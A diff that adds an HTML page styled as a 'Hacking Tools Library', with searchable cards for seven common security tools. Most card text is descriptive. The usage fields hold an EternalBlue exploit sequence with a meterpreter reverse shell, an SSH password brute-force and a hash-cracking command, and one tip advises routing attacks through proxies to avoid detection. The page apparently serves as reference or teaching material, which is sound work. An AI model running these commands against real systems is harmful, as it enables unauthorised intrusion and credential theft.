@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Hacking Tools Library</title>
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background: radial-gradient(circle, rgba(0, 0, 0, 1) 0%, rgba(10, 10, 10, 1) 100%);
+      color: #00ffcc;
+      min-height: 100vh;
+      padding-bottom: 50px;
+      overflow-x: hidden;
+      font-size: 18px;
+    }
+    header {
+      text-align: center;
+      padding: 30px 20px;
+      background: rgba(0, 255, 204, 0.2);
+      backdrop-filter: blur(15px);
+      border-bottom: 3px solid #00ffcc;
+      box-shadow: 0 0 30px #00ffcc;
+      position: relative;
+    }
+    header h1 {
+      font-size: 3rem;
+      margin: 0;
+      color: #00ffcc;
+      text-shadow: 0 0 15px #00ffcc, 0 0 30px #00ffcc;
+      letter-spacing: 1px;
+    }
+    .search-bar {
+      margin: 20px auto;
+      max-width: 600px;
+      text-align: center;
+    }
+    .search-bar input {
+      width: 90%;
+      padding: 12px 20px;
+      font-size: 1.2rem;
+      border-radius: 10px;
+      border: 1px solid #00ffcc;
+      outline: none;
+      background: #111;
+      color: #00ffcc;
+      transition: all 0.3s ease;
+    }
+    .search-bar input:focus {
+      border-color: #00ffe5;
+      box-shadow: 0 0 15px #00ffe5;
+    }
+    .container {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 30px;
+      padding: 30px;
+      max-width: 1200px;
+      margin: auto;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(15px);
+      border-radius: 20px;
+      padding: 20px;
+      cursor: pointer;
+      border: 2px solid #00ffcc44;
+      transition: all 0.4s ease;
+      position: relative;
+      box-shadow: 0 0 20px rgba(0, 255, 204, 0.4);
+      z-index: 1;
+      overflow: hidden;
+      text-align: center;
+    }
+    .card:hover {
+      transform: scale(1.05) rotate(1deg);
+      box-shadow: 0 0 40px #00ffcc99;
+      border: 2px solid #00ffe5;
+      animation: glitch 1s ease-in-out infinite;
+    }
+    .card h2 {
+      font-size: 1.5rem;
+      color: #00ffe5;
+      text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffe5;
+      margin-top: 0;
+      transition: transform 0.3s ease;
+    }
+    .card:hover h2 {
+      transform: translateY(-5px);
+    }
+    .tool-details {
+      max-height: 0;
+      overflow: hidden;
+      transition: max-height 0.5s ease;
+    }
+    .card.active .tool-details {
+      max-height: 1000px;
+      margin-top: 10px;
+    }
+    .tool-details p, .tool-details pre {
+      margin: 10px 0;
+      font-size: 1rem;
+    }
+    pre {
+      background: #111;
+      padding: 10px;
+      border-radius: 8px;
+      color: #0f0;
+      overflow-x: auto;
+      font-size: 0.95rem;
+    }
+    @keyframes glitch {
+      0% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      50% { transform: translateX(5px); }
+      75% { transform: translateX(-5px); }
+      100% { transform: translateX(5px); }
+    }
+    @media screen and (max-width: 600px) {
+      header h1 {
+        font-size: 2rem;
+      }
+      .search-bar input {
+        font-size: 1rem;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1><i class="fas fa-user-secret"></i> Hacking Tools Library</h1>
+  </header>
+
+  <div class="search-bar">
+    <input type="text" id="searchInput" onkeyup="filterCards()" placeholder="Search tool by name...">
+  </div>
+
+  <div class="container" id="toolsContainer">
+    <!-- Cards will be injected here -->
+  </div>
+
+  <script>
+    const tools = [
+      {
+        name: 'Nmap',
+        short: 'Network scanner for host discovery and port scanning.',
+        long: 'Nmap is an open-source tool used by network admins and pentesters to discover hosts and services on a network.',
+        usage: 'nmap -sV 192.168.1.1\\nnmap -A 192.168.1.0/24',
+        tips: 'Use Nmap scripting engine (NSE) for advanced scanning.'
+      },
+      {
+        name: 'Metasploit',
+        short: 'Penetration testing framework for exploiting vulnerabilities.',
+        long: 'Metasploit helps develop and execute exploits against remote targets with a collection of tools and modules.',
+        usage: 'use exploit/windows/smb/ms17_010_eternalblue\\nset RHOST 192.168.1.10\\nset PAYLOAD windows/meterpreter/reverse_tcp\\nset LHOST 192.168.1.5\\nexploit',
+        tips: 'Useful for post-exploitation and privilege escalation.'
+      },
+      {
+        name: 'Burp Suite',
+        short: 'Web application security testing tool.',
+        long: 'Burp Suite is a platform for performing security testing of web apps with intercepting proxy, repeater, and scanner tools.',
+        usage: 'Use Repeater tab to modify intercepted requests.',
+        tips: 'Use the Scanner to identify vulnerabilities automatically.'
+      },
+      {
+        name: 'Wireshark',
+        short: 'Network protocol analyzer.',
+        long: 'Wireshark captures and analyzes network packets for troubleshooting and security analysis.',
+        usage: 'ip.addr == 192.168.1.100',
+        tips: 'Use decryption keys to inspect encrypted SSL/TLS traffic.'
+      },
+      {
+        name: 'John the Ripper',
+        short: 'Password cracking tool.',
+        long: 'John is a fast password cracker that uses dictionary attacks and brute force to break hashed passwords.',
+        usage: 'john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt',
+        tips: 'Use ‘unshadow’ to prepare password and shadow files for cracking.'
+      },
+      {
+        name: 'Nikto',
+        short: 'Web server vulnerability scanner.',
+        long: 'Nikto scans web servers for dangerous files, outdated software, and misconfigurations.',
+        usage: 'nikto -h http://example.com',
+        tips: 'Integrate with Nmap for better scanning coverage.'
+      },
+      {
+        name: 'Hydra',
+        short: 'Network logon cracker.',
+        long: 'Hydra is a fast and flexible tool for brute-forcing credentials across various protocols like SSH, FTP, and HTTP.',
+        usage: 'hydra -l admin -P rockyou.txt 192.168.1.10 ssh',
+        tips: 'Run through proxies to avoid detection.'
+      }
+    ];
+
+    const container = document.getElementById('toolsContainer');
+
+    function renderTools(data) {
+      container.innerHTML = '';
+      data.forEach(tool => {
+        const card = document.createElement('div');
+        card.classList.add('card');
+        card.innerHTML = `
+          <h2>${tool.name}</h2>
+          <div class="tool-details">
+            <p><strong>Short:</strong> ${tool.short}</p>
+            <p><strong>Long:</strong> ${tool.long}</p>
+            <p><strong>Usage:</strong></p>
+            <pre>${tool.usage}</pre>
+            <p><strong>Tips:</strong> ${tool.tips}</p>
+          </div>
+        `;
+        card.addEventListener('click', () => card.classList.toggle('active'));
+        container.appendChild(card);
+      });
+    }
+
+    function filterCards() {
+      const input = document.getElementById('searchInput').value.toLowerCase();
+      const filtered = tools.filter(tool => tool.name.toLowerCase().includes(input));
+      renderTools(filtered);
+    }
+
+    renderTools(tools);
+  </script>
+</body>
+</html>
